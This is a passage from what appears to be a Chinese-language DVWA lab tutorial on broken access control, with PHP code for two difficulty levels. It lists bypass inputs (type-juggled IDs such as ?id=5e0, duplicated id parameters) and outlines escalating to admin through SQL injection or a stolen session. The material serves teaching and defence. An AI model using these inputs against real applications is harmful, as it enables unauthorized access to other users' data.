own data&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 管理员可以访问所有用户数据 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userRole</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 管理员权限：查看、修改、删除任何用户</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询用户信息</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;i&#x27;</span>, <span class="variable">$userId</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_stmt_get_result</span>(<span class="variable">$stmt</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示用户信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ★★★ 改进：不再显示密码哈希 ★★★</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>Anti-CSRF Token</strong> - 防止跨站请求伪造</li>
+<li><strong>基于数据库的角色</strong> - 从数据库读取用户角色</li>
+<li><strong>资源所有权检查</strong> - 验证用户是否可以访问该资源</li>
+<li><strong>使用预编译语句</strong> - 防止SQL注入</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>类型比较漏洞</strong> - 使用<code>!=</code>而不是<code>!==</code></li>
+<li><strong>参数篡改</strong> - 可以尝试各种输入绕过检查</li>
+<li><strong>逻辑漏洞</strong> - 某些边界情况未考虑</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：类型混淆绕过"><a href="#方法1：类型混淆绕过" class="headerlink" title="方法1：类型混淆绕过"></a>方法1：类型混淆绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码中：</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userId</span> != <span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">    <span class="comment">// 拒绝访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 问题：$userId是字符串，$currentUserId是整数</span></span><br><span class="line"><span class="comment">// PHP的弱类型比较可能导致绕过</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>测试：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当前用户ID: 5</span><br><span class="line"></span><br><span class="line">尝试：</span><br><span class="line">?<span class="attribute">id</span>=5    → 通过（相等）</span><br><span class="line">?<span class="attribute">id</span>=5.0  → 可能通过（5 != 5.0 is <span class="literal">false</span>）</span><br><span class="line">?<span class="attribute">id</span>=5e0  → 可能通过（科学计数法）</span><br><span class="line">?<span class="attribute">id</span>=05   → 可能通过（前导零）</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：参数污染"><a href="#方法2：参数污染" class="headerlink" title="方法2：参数污染"></a>方法2：参数污染</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">5</span>&amp;<span class="built_in">id</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">某些服务器配置下，可能导致：</span><br><span class="line">- 第一个<span class="built_in">id</span>用于检查（通过）</span><br><span class="line">- 第二个<span class="built_in">id</span>用于查询（访问user_id=<span class="number">2</span>）</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：会话固定"><a href="#方法3：会话固定" class="headerlink" title="方法3：会话固定"></a>方法3：会话固定</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 创建新账户（普通用户）</span><br><span class="line"><span class="bullet">2.</span> 修改数据库，将角色改为admin（如果有SQL注入）</span><br><span class="line"><span class="bullet">3.</span> 或窃取管理员Session</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的权限检查，真正安全。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Impossible: 完善的权限管理 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="comment">// 未登录，重定向</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护1：验证CSRF Token ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>(</span><br><span class="line">        <span class="variable">$_REQUEST</span>[<span class="string">&#x27;user_token&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_token&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护2：完善的权限检查类 ★★★</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Authorization</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户角色</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserRole</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>; <span class="comment">// PDO连接</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 使用PDO预编译 ★★★</span></span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT role FROM users WHERE user = :username&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] : <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户ID</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserId</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id FROM users WHERE user = :username&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$result</span>[<span class="string">&#x27;user_id&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以访问用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canAccessUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前用户角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 管理员可以访问所有用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 普通用户只能访问自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 使用严格比较（===） ★★★</span></span><br><span class="line">        <span class="comment">// 防止类型混淆攻击</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以修改用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canModifyUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 只有管理员可以修改其他用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 普通用户只能修改自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以删除用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canDeleteUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 只有管理员可以删除用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 管理员不能删除自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 获取并验证用户ID ★★★</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 输入验证 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$userId</span>) || <span class="variable">$userId</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid user ID&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 权限检查：是否可以访问该用户 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canAccessUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$userId</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to view this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 记录未授权访问尝试 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized access attempt&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">        <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>)</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 安全地查询用户信息 ★★★</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, avatar FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 安全地显示信息 ★★★</span></span><br><span class="line">    <span class="comment">// 使用htmlspecialchars()防止XSS</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;First Name: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;first_name&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Last Name: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;last_name&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 不显示密码哈希 ★★★</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;User not found&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 处理修改请求 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$updateUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查：是否可以修改该用户 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canModifyUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$updateUserId</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to modify this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized modify attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$updateUserId</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行修改...</span></span><br><span class="line">    <span class="comment">// 使用PDO预编译语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 处理删除请求 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$deleteUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;delete_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查：是否可以删除该用户 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canDeleteUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$deleteUserId</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to delete this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized delete attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$deleteUserId</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>认证检查</strong> - 验证用户是否登录</li>
+<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
+<li><strong>角色验证</strong> - 从数据库读取真实角色</li>
+<li><strong>资源所有权</strong> - 验证是否有权访问该资源</li>
+<li><strong>操作权限</strong> - 不同操作有不同的权限要求</li>
+<li><strong>输入验证</strong> - 验证所有输入参数</li>
+<li><strong>PDO预编译</strong> - 防止SQL注入</li>
+<li><strong>输出编码</strong> - htmlspecialchars()防XSS</li>
+<li><strong>审计日志</strong> - 记录所有未授权访问尝试</li>
+<li><strong>严格类型比较</strong> - 使用&#x3D;&#x3D;&#x3D;防止类型混淆</li>
+</ol>
+<p><strong>权限检查流程：</strong></p>
